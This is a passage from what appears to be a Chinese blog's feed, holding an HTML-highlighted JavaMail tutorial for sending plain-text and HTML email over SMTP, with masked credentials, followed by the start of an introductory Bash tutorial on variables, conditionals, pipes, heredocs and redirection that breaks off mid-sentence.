class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">package</span> net.kuangmeng.mail; </span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* 发送邮件需要使用的基本信息  </span></span><br><span class="line"><span class="comment">*/</span>   </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;   </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MailSenderInfo</span> </span>&#123;   </span><br><span class="line">    <span class="comment">// 发送邮件的服务器的IP和端口   </span></span><br><span class="line">    <span class="keyword">private</span> String mailServerHost;   </span><br><span class="line">    <span class="keyword">private</span> String mailServerPort = <span class="string">"25"</span>;   </span><br><span class="line">    <span class="comment">// 邮件发送者的地址   </span></span><br><span class="line">    <span class="keyword">private</span> String fromAddress;   </span><br><span class="line">    <span class="comment">// 邮件接收者的地址   </span></span><br><span class="line">    <span class="keyword">private</span> String toAddress;   </span><br><span class="line">    <span class="comment">// 登陆邮件发送服务器的用户名和密码   </span></span><br><span class="line">    <span class="keyword">private</span> String userName;   </span><br><span class="line">    <span class="keyword">private</span> String password;   </span><br><span class="line">    <span class="comment">// 是否需要身份验证   </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> validate = <span class="keyword">false</span>;   </span><br><span class="line">    <span class="comment">// 邮件主题   </span></span><br><span class="line">    <span class="keyword">private</span> String subject;   </span><br><span class="line">    <span class="comment">// 邮件的文本内容   </span></span><br><span class="line">    <span class="keyword">private</span> String content;   </span><br><span class="line">    <span class="comment">// 邮件附件的文件名   </span></span><br><span class="line">    <span class="keyword">private</span> String[] attachFileNames;     </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">      * 获得邮件会话属性  </span></span><br><span class="line"><span class="comment">      */</span>   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProperties</span><span class="params">()</span></span>&#123;   </span><br><span class="line">      Properties p = <span class="keyword">new</span> Properties();   </span><br><span class="line">      p.put(<span class="string">"mail.smtp.host"</span>, <span class="keyword">this</span>.mailServerHost);   </span><br><span class="line">      p.put(<span class="string">"mail.smtp.port"</span>, <span class="keyword">this</span>.mailServerPort);   </span><br><span class="line">      p.put(<span class="string">"mail.smtp.auth"</span>, validate ? <span class="string">"true"</span> : <span class="string">"false"</span>);   </span><br><span class="line">      <span class="keyword">return</span> p;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMailServerHost</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> mailServerHost;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMailServerHost</span><span class="params">(String mailServerHost)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.mailServerHost = mailServerHost;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMailServerPort</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> mailServerPort;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMailServerPort</span><span class="params">(String mailServerPort)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.mailServerPort = mailServerPort;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidate</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> validate;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValidate</span><span class="params">(<span class="keyword">boolean</span> validate)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.validate = validate;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> String[] getAttachFileNames() &#123;   </span><br><span class="line">      <span class="keyword">return</span> attachFileNames;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAttachFileNames</span><span class="params">(String[] fileNames)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.attachFileNames = fileNames;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFromAddress</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> fromAddress;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFromAddress</span><span class="params">(String fromAddress)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.fromAddress = fromAddress;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> password;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.password = password;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getToAddress</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> toAddress;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setToAddress</span><span class="params">(String toAddress)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.toAddress = toAddress;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUserName</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> userName;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserName</span><span class="params">(String userName)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.userName = userName;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSubject</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> subject;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSubject</span><span class="params">(String subject)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.subject = subject;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">return</span> content;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContent</span><span class="params">(String textContent)</span> </span>&#123;   </span><br><span class="line">      <span class="keyword">this</span>.content = textContent;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="邮件发送器">邮件发送器</h2><p>文件名：<code>SimpleMailSender.java</code></p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">package</span> net.kuangmeng.mail;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;   </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line"><span class="keyword">import</span> javax.mail.Address;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.BodyPart;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.Message;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.MessagingException;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.Multipart;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.Session;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.Transport;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.InternetAddress;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeBodyPart;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMessage;   </span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMultipart;   </span><br><span class="line">  </span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* 简单邮件（不带附件的邮件）发送器  </span></span><br><span class="line"><span class="comment">*/</span>   </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleMailSender</span>  </span>&#123;   </span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">  * 以文本格式发送邮件  </span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> mailInfo 待发送的邮件的信息  </span></span><br><span class="line"><span class="comment">  */</span>   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">sendTextMail</span><span class="params">(MailSenderInfo mailInfo)</span> </span>&#123;   </span><br><span class="line">      <span class="comment">// 判断是否需要身份认证   </span></span><br><span class="line">      MyAuthenticator authenticator = <span class="keyword">null</span>;   </span><br><span class="line">      Properties pro = mailInfo.getProperties();  </span><br><span class="line">      <span class="keyword">if</span> (mailInfo.isValidate()) &#123;   </span><br><span class="line">      <span class="comment">// 如果需要身份认证，则创建一个密码验证器   </span></span><br><span class="line">        authenticator = <span class="keyword">new</span> MyAuthenticator(mailInfo.getUserName(), mailInfo.getPassword());   </span><br><span class="line">      &#125;  </span><br><span class="line">      <span class="comment">// 根据邮件会话属性和密码验证器构造一个发送邮件的session   </span></span><br><span class="line">      Session sendMailSession = Session.getDefaultInstance(pro,authenticator);   </span><br><span class="line">      <span class="keyword">try</span> &#123;   </span><br><span class="line">      <span class="comment">// 根据session创建一个邮件消息   </span></span><br><span class="line">      Message mailMessage = <span class="keyword">new</span> MimeMessage(sendMailSession);   </span><br><span class="line">      <span class="comment">// 创建邮件发送者地址   </span></span><br><span class="line">      Address from = <span class="keyword">new</span> InternetAddress(mailInfo.getFromAddress());   </span><br><span class="line">      <span class="comment">// 设置邮件消息的发送者   </span></span><br><span class="line">      mailMessage.setFrom(from);   </span><br><span class="line">      <span class="comment">// 创建邮件的接收者地址，并设置到邮件消息中   </span></span><br><span class="line">      Address to = <span class="keyword">new</span> InternetAddress(mailInfo.getToAddress());   </span><br><span class="line">      mailMessage.setRecipient(Message.RecipientType.TO,to);   </span><br><span class="line">      <span class="comment">// 设置邮件消息的主题   </span></span><br><span class="line">      mailMessage.setSubject(mailInfo.getSubject());   </span><br><span class="line">      <span class="comment">// 设置邮件消息发送的时间   </span></span><br><span class="line">      mailMessage.setSentDate(<span class="keyword">new</span> Date());   </span><br><span class="line">      <span class="comment">// 设置邮件消息的主要内容   </span></span><br><span class="line">      String mailContent = mailInfo.getContent();   </span><br><span class="line">      mailMessage.setText(mailContent);   </span><br><span class="line">      <span class="comment">// 发送邮件   </span></span><br><span class="line">      Transport.send(mailMessage);  </span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;   </span><br><span class="line">      &#125; <span class="keyword">catch</span> (MessagingException ex) &#123;   </span><br><span class="line">          ex.printStackTrace();   </span><br><span class="line">      &#125;   </span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">      * 以HTML格式发送邮件  </span></span><br><span class="line"><span class="comment">      * <span class="doctag">@param</span> mailInfo 待发送的邮件信息  </span></span><br><span class="line"><span class="comment">      */</span>   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">sendHtmlMail</span><span class="params">(MailSenderInfo mailInfo)</span></span>&#123;   </span><br><span class="line">      <span class="comment">// 判断是否需要身份认证   </span></span><br><span class="line">      MyAuthenticator authenticator = <span class="keyword">null</span>;  </span><br><span class="line">      Properties pro = mailInfo.getProperties();  </span><br><span class="line">      <span class="comment">//如果需要身份认证，则创建一个密码验证器    </span></span><br><span class="line">      <span class="keyword">if</span> (mailInfo.isValidate()) &#123;   </span><br><span class="line">        authenticator = <span class="keyword">new</span> MyAuthenticator(mailInfo.getUserName(), mailInfo.getPassword());  </span><br><span class="line">      &#125;   </span><br><span class="line">      <span class="comment">// 根据邮件会话属性和密码验证器构造一个发送邮件的session   </span></span><br><span class="line">      Session sendMailSession = Session.getDefaultInstance(pro,authenticator);   </span><br><span class="line">      <span class="keyword">try</span> &#123;   </span><br><span class="line">      <span class="comment">// 根据session创建一个邮件消息   </span></span><br><span class="line">      Message mailMessage = <span class="keyword">new</span> MimeMessage(sendMailSession);   </span><br><span class="line">      <span class="comment">// 创建邮件发送者地址   </span></span><br><span class="line">      Address from = <span class="keyword">new</span> InternetAddress(mailInfo.getFromAddress());   </span><br><span class="line">      <span class="comment">// 设置邮件消息的发送者   </span></span><br><span class="line">      mailMessage.setFrom(from);   </span><br><span class="line">      <span class="comment">// 创建邮件的接收者地址，并设置到邮件消息中   </span></span><br><span class="line">      Address to = <span class="keyword">new</span> InternetAddress(mailInfo.getToAddress());   </span><br><span class="line">      <span class="comment">// Message.RecipientType.TO属性表示接收者的类型为TO   </span></span><br><span class="line">      mailMessage.setRecipient(Message.RecipientType.TO,to);   </span><br><span class="line">      <span class="comment">// 设置邮件消息的主题   </span></span><br><span class="line">      mailMessage.setSubject(mailInfo.getSubject());   </span><br><span class="line">      <span class="comment">// 设置邮件消息发送的时间   </span></span><br><span class="line">      mailMessage.setSentDate(<span class="keyword">new</span> Date());   </span><br><span class="line">      <span class="comment">// MiniMultipart类是一个容器类，包含MimeBodyPart类型的对象   </span></span><br><span class="line">      Multipart mainPart = <span class="keyword">new</span> MimeMultipart();   </span><br><span class="line">      <span class="comment">// 创建一个包含HTML内容的MimeBodyPart   </span></span><br><span class="line">      BodyPart html = <span class="keyword">new</span> MimeBodyPart();   </span><br><span class="line">      <span class="comment">// 设置HTML内容   </span></span><br><span class="line">      html.setContent(mailInfo.getContent(), <span class="string">"text/html; charset=utf-8"</span>);   </span><br><span class="line">      mainPart.addBodyPart(html);   </span><br><span class="line">      <span class="comment">// 将MiniMultipart对象设置为邮件内容   </span></span><br><span class="line">      mailMessage.setContent(mainPart);   </span><br><span class="line">      <span class="comment">// 发送邮件   </span></span><br><span class="line">      Transport.send(mailMessage);   </span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;   </span><br><span class="line">      &#125; <span class="keyword">catch</span> (MessagingException ex) &#123;   </span><br><span class="line">          ex.printStackTrace();   </span><br><span class="line">      &#125;   </span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="发件人设置">发件人设置</h2><p>文件名：<code>MyAuthenticator.java</code></p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">package</span> net.kuangmeng.mail;</span><br><span class="line"><span class="keyword">import</span> javax.mail.*;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAuthenticator</span> <span class="keyword">extends</span> <span class="title">Authenticator</span></span>&#123;  </span><br><span class="line">    String userName=<span class="keyword">null</span>;  </span><br><span class="line">    String password=<span class="keyword">null</span>;  </span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyAuthenticator</span><span class="params">()</span></span>&#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyAuthenticator</span><span class="params">(String username, String password)</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">this</span>.userName = username;   </span><br><span class="line">        <span class="keyword">this</span>.password = password;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> PasswordAuthentication <span class="title">getPasswordAuthentication</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> PasswordAuthentication(userName, password);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="实际发送">实际发送</h2><p>文件名：<code>MailAction.java</code></p><pre><code class="language-java">package net.kuangmeng.mail;import net.kuangmeng.*;public class MailAction {@SuppressWarnings(&quot;static-access&quot;)public static void main(String[] args){          //这个类主要是设置邮件       MailSenderInfo mailInfo = new MailSenderInfo();        mailInfo.setMailServerHost(&quot;smtp.yeah.net&quot;);        mailInfo.setMailServerPort(&quot;25&quot;);        mailInfo.setValidate(true);        mailInfo.setUserName(&quot;*****@yeah.net&quot;);        mailInfo.setPassword(&quot;******&quot;);//您的邮箱密码        mailInfo.setFromAddress(&quot;*****@yeah.net&quot;);        mailInfo.setToAddress(&quot;****@qq.com&quot;);        mailInfo.setSubject(&quot;你好！&quot;);//邮件主题       mailInfo.setContent(&quot;这是一个测试&quot;);//邮件内容        //这个类主要来发送邮件        SimpleMailSender sms = new SimpleMailSender();        sms.sendTextMail(mailInfo);//发送文体格式         sms.sendHtmlMail(mailInfo);//发送html格式    }}</code></pre><p><br><br>本文链接： <a href="http://home.meng.uno/articles/21f3b9c2/">http://home.meng.uno/articles/21f3b9c2/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      我觉得学会Java mail是一件很自豪的事，怎么说呢，邮箱这么有逼格的东西都能被你玩的很溜的话，一定不一般。 本次试验使用了 javax.mail.jarjar包，请自行百度下载。 我实现的Java mail主要包括4个部分：

 1. 发送邮件使用的基本信息
 2. 邮件发送器
 3. 发件人设置
 4. 实际发送

四个部分组成。

发送邮件使用的基本信息
文件名：MailSenderInfo.java 代码如下，我仍然以备注的形式讲解：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="软件工程" scheme="http://home.meng.uno/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Bash的使用</title>
    <link href="http://home.meng.uno/articles/19f2d195/"/>
    <id>http://home.meng.uno/articles/19f2d195/</id>
    <published>2016-12-03T09:23:17.000Z</published>
    <updated>2020-12-02T01:41:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="显示-hello-world">显示 “Hello world!”</h2><p>echo Hello world!</p><h2 id="每一句指令以换行或分号隔开：">每一句指令以换行或分号隔开：</h2><p>echo ‘This is the first line’; echo ‘This is the second line’</p><h2 id="声明一个变量：">声明一个变量：</h2><p>Variable=“Some string”</p><p>***这是错误的做法：***Variable = “Some string”</p><p>***原因：***Bash 会把 Variable 当做一个指令，由于找不到该指令，因此这里会报错。</p><p>***也不可以这样：***Variable= ‘Some string’</p><p>***原因：***Bash 会认为 ‘Some string’ 是一条指令，由于找不到该指令，这里再次报错。这个例子中 ‘Variable=’ 这部分会被当作仅对 ‘Some string’ 起作用的赋值。）</p><h2 id="使用变量：">使用变量：</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">echo <span class="variable">$Variable</span></span><br><span class="line">echo <span class="string">"$Variable"</span></span><br><span class="line">echo <span class="string">'$Variable'</span></span><br></pre>      </td>    </tr>  </table></figure><p>当你赋值 (assign) 、导出 (export)，或者以其他方式使用变量时，变量名前不加 $。如果要使用变量的值， 则要加 $。</p><p><strong><em>注意:</em></strong> ’ (单引号) 不会展开变量（即会屏蔽掉变量）。</p><h2 id="在变量内部进行字符串代换">在变量内部进行字符串代换</h2><p>echo ${Variable/Some/A}</p><p>会把 Variable 中首次出现的 “some” 替换成 “A”。</p><h2 id="变量的截取">变量的截取</h2><p>Length=7</p><p>echo ${Variable:0:Length}</p><p>这样会仅返回变量值的前7个字符</p><h2 id="变量的默认值">变量的默认值</h2><p>echo ${Foo:-“DefaultValueIfFooIsMissingOrEmpty”}</p><p>对 null (Foo=) 和空串 (Foo=&quot;&quot;) 起作用； 零（Foo=0）时返回0</p><p>注意这仅返回默认值而不是改变变量的值</p><h2 id="内置变量：">内置变量：</h2><h3 id="下面的内置变量很有用">下面的内置变量很有用</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">echo <span class="string">"Last program return value: $?"</span></span><br><span class="line">echo <span class="string">"Script's PID: $$"</span></span><br><span class="line">echo <span class="string">"Number of arguments: $#"</span></span><br><span class="line">echo <span class="string">"Scripts arguments: $@"</span></span><br><span class="line">echo <span class="string">"Scripts arguments separated in different variables: $1 $2..."</span></span><br></pre>      </td>    </tr>  </table></figure><h3 id="读取输入：">读取输入：</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">echo <span class="string">"What's your name?"</span></span><br><span class="line">read Name # 这里不需要声明新变量</span><br><span class="line">echo Hello, <span class="variable">$Name</span>!</span><br></pre>      </td>    </tr>  </table></figure><h2 id="通常的-if-结构看起来像这样：">通常的 if 结构看起来像这样：</h2><p><strong><em>’man test’ 可查看更多的信息</em></strong></p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">if</span> [ <span class="variable">$Name</span> -ne <span class="variable">$USER</span> ]</span><br><span class="line">then</span><br><span class="line">    echo <span class="string">"Your name isn't your username"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    echo <span class="string">"Your name is your username"</span></span><br><span class="line">fi</span><br></pre>      </td>    </tr>  </table></figure><h2 id="根据上一个指令执行结果决定是否执行下一个指令">根据上一个指令执行结果决定是否执行下一个指令</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">echo "Always executed" || echo "Only executed if first command fails"</span><br><span class="line">echo <span class="string">"Always executed"</span> &amp;&amp; echo <span class="string">"Only executed if first command does NOT fail"</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="在-if-语句中使用-和-需要多对方括号">在 if 语句中使用 &amp;&amp; 和 || 需要多对方括号</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">if</span> [ <span class="variable">$Name</span> == <span class="string">"Steve"</span> ] &amp;&amp; [ <span class="variable">$Age</span> -eq <span class="number">15</span> ]</span><br><span class="line">then</span><br><span class="line">    echo <span class="string">"This will run if $Name is Steve AND $Age is 15."</span></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ $Name == "Daniya" ] || [ $Name == "Zach" ]</span><br><span class="line">then</span><br><span class="line">    echo <span class="string">"This will run if $Name is Daniya OR Zach."</span></span><br><span class="line">fi</span><br></pre>      </td>    </tr>  </table></figure><h2 id="表达式的格式如下">表达式的格式如下:</h2><p>echo $(( 10 + 5 ))</p><h2 id="指令可以带有选项：">指令可以带有选项：</h2><p><strong><em>与其他编程语言不同的是，bash 运行时依赖上下文。比如，使用 ls 时，列出当前目录。</em></strong></p><figure class="highlight ls">  <figcaption><span>-l``` 列出文件和目录的详细信息</span></figcaption>  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line"><span class="comment">## 前一个指令的输出可以当作后一个指令的输入。</span></span><br><span class="line">``<span class="javascript"><span class="string">`grep</span></span>``` 用来匹配字符串。</span><br><span class="line"><span class="comment">## 用下面的指令列出当前目录下所有的 txt 文件：</span></span><br><span class="line">``<span class="javascript"><span class="string">`ls -l | grep "\.txt"</span></span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="以-eof-作为结束标记从标准输入读取数据并覆盖-hello-py">以 ^EOF$ 作为结束标记从标准输入读取数据并覆盖 <a href="http://hello.py" target="_blank" rel="noopener">hello.py</a></h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line">cat &gt; hello<span class="selector-class">.py</span> &lt;&lt; EOF</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">from __future__ import print_function</span><br><span class="line">import sys</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"#stdout"</span>, file=sys.stdout)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"#stderr"</span>, file=sys.stderr)</span></span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> sys<span class="selector-class">.stdin</span>:</span><br><span class="line">    print(line, file=sys.stdout)</span><br><span class="line">EOF</span><br></pre>      </td>    </tr>  </table></figure><h2 id="重定向可以到输出-输入和错误输出">重定向可以到输出，输入和错误输出</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">python hello<span class="selector-class">.py</span> &lt; <span class="string">"input.in"</span></span><br><span class="line">python hello<span class="selector-class">.py</span> &gt; <span class="string">"output.out"</span></span><br><span class="line">python hello<span class="selector-class">.py</span> <span class="number">2</span>&gt; <span class="string">"error.err"</span></span><br><span class="line">python hello<span class="selector-class">.py</span> &gt; <span class="string">"output-and-error.log"</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">python hello<span class="selector-class">.py</span> &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"># &gt; 会覆盖已存在的文件， &gt;&gt; 